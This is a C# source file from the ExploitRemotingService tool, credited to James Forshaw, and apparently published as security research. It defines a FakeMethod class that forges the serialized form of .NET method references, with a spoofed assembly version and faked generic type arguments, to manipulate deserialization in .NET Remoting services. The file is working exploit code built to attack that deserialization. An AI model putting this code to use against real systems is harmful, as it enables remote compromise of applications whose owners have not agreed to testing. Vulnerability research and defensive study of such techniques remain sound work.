﻿//    ExploitRemotingService
//    Copyright (C) 2014 James Forshaw
//
//    This program is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program.  If not, see <http://www.gnu.org/licenses/>.

using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;

namespace ExploitRemotingService
{
    [Serializable, ComVisible(true)]
    class FakeMethod : MethodBase, ISerializable
    {
        MethodBase _mb;
        int _version;

        public FakeMethod(MethodBase mb, int version)
        {
            _mb = mb;
            _version = version;
        }

        private void GetSerializationInfo(SerializationInfo info, string name, Type reflectedClass, string signature, MemberTypes type, Type[] genericArguments)
        {
            if (info == null)
            {
                throw new ArgumentNullException("info");
            }

            AssemblyName asmname = reflectedClass.Assembly.GetName();

            asmname.Version = new Version(_version, 0, 0, 0);

            string fullName = asmname.ToString();
                               
            string str2 = reflectedClass.FullName;
            Type t = typeof(int).Assembly.GetType("System.Reflection.MemberInfoSerializationHolder");

            info.SetType(t);

            for (int i = 0; i < genericArguments.Length; ++i)
            {
                genericArguments[i] = new FakeType(genericArguments[i], _version);
            }

            // This is here to prevent a de-serialization bug
            if (genericArguments.Length > 0)
            {
                info.AddValue("DUMMY", genericArguments[0]);
            }
            info.AddValue("GenericArguments", genericArguments, typeof(Type[]));
            info.AddValue("Name", name, typeof(string));
            info.AddValue("AssemblyName", fullName, typeof(string));
            info.AddValue("ClassName", str2, typeof(string));
            info.AddValue("Signature", signature, typeof(string));
            info.AddValue("MemberType", (int)type);
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            GetSerializationInfo(info, _mb.Name, _mb.DeclaringType, _mb.ToString(), MemberTypes.Method, _mb.GetGenericArguments());
        }

        public override MethodAttributes Attributes
        {
            get { throw new NotImplementedException(); }
        }

        public override MethodImplAttributes GetMethodImplementationFlags()
        {
            throw new NotImplementedException();
        }

        public override ParameterInfo[] GetParameters()
        {
            throw new NotImplementedException();
        }

        public override object Invoke(object obj, BindingFlags invokeAttr, Binder binder, object[] parameters, System.Globalization.CultureInfo culture)
        {
            throw new NotImplementedException();
        }

        public override RuntimeMethodHandle MethodHandle
        {
            get { throw new NotImplementedException(); }
        }

        public override Type DeclaringType
        {
            get { throw new NotImplementedException(); }
        }

        public override object[] GetCustomAttributes(Type attributeType, bool inherit)
        {
            throw new NotImplementedException();
        }

        public override object[] GetCustomAttributes(bool inherit)
        {
            throw new NotImplementedException();
        }

        public override bool IsDefined(Type attributeType, bool inherit)
        {
            throw new NotImplementedException();
        }

        public override MemberTypes MemberType
        {
            get { throw new NotImplementedException(); }
        }

        public override string Name
        {
            get { return _mb.Name; }
        }

        public override Type ReflectedType
        {
            get { throw new NotImplementedException(); }
        }
    }
}
